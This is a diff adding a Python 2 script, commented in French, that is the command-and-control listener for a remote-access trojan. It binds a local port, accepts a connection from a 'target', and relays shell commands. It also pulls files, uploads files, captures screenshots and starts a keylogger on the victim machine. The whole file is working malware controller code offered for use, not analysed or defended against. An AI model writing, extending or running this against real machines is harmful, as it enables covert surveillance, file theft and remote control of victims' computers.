@@ -1,0 +1,96 @@
+#!usr/bin/python
+# -*- coding: utf-8 -*-
+
+import socket
+import json
+import base64
+
+localIP = "192.168.1.27"
+portbind = 51234
+
+def reliable_send(data): #pour envoyer plus de 1024 bits
+	json_data = json.dumps(data, ensure_ascii=False)
+	#print "sending "
+	#print json_data
+	target.send(json_data)
+
+def reliable_recv():
+	data = "" #empty
+	while True:
+		try:
+			data = data + target.recv(1024)
+			#print "data recv"
+			#print data.decode('utf-8','ignore')
+			#print "json.loads(data)"
+			#print json.loads(data.decode('utf-8','ignore'))
+			#print "receiving :"
+			#print json.loads(data.decode('utf-8'))
+			return json.loads(data.decode('utf-8','ignore')) #une fois que c bon y a tout dans data
+		except ValueError:
+			continue #si on recoit plus de 1024 on continue
+
+def shell():
+	global count
+	while True:
+		command = raw_input("* Shell#~%s: " %str(ip))
+		reliable_send(command)
+		if command == 'q':
+			break
+		elif command[:2] == "cd" and len(command) > 1: #on attend pas de retour
+			continue
+		elif command[:8] == "download":
+			with open(command[9:],"wb") as file: #on open the file to write bytes
+				file_data = reliable_recv() #on recv la data dans file_data
+				file.write(base64.b64decode(file_data)) #on write la data decodee
+		elif command[:6] == "upload":
+			try:
+				with open(command[7:], "rb") as fin: #read bytes
+					print "upload send"
+					send = base64.b64encode(fin.read())
+					print send
+					print "decode"
+					print base64.b64decode(send)
+					reliable_send(base64.b64encode(send))
+			except:
+				failed = "Failed to upload"
+				reliable_send(base64.b64encode(failed))
+		elif command[:10] == "screenshot":
+			with open("screenshot%d.png" % count, "wb") as screen: #count va augmenter
+				#print "fichier open"
+				image = reliable_recv()
+				#print image
+				image_decoded = base64.b64decode(image)
+				#print "image decoded"
+				if image_decoded[:4] == "[!!]":
+					print(image_decoded) #car c ce qu'on revoie qd il y a une erreur
+				else:
+					screen.write(image_decoded)
+					print("Screenshot shot !")
+					count += 1
+		elif command[:12] == "keylog_start":
+			continue #pour pas bloquer vu que la fonction renvoie rien
+		else:
+			result = reliable_recv()
+			#print "result"
+			print(result)
+
+def server():
+	global s
+	global ip
+	global target
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ipv4 connection ; TCP connection
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #options pour le sokcet object
+
+	s.bind((localIP,portbind)) #ca va bind notre ip addresse locale vers le port specifie entre (), veririfer que le port n'est pas utilise
+	s.listen(5) #listen for incomming connexions, entre () le nombre
+
+	print("[+] Listening for incoming connections")
+
+	target, ip = s.accept() #on stocke la connexion, socket obj in target, ip stocke ip et port
+	print("[+] Connection established from: %s" % str(ip))
+
+count = 1 #comtpeur pour les screenshots
+
+server()
+shell()
+s.close()
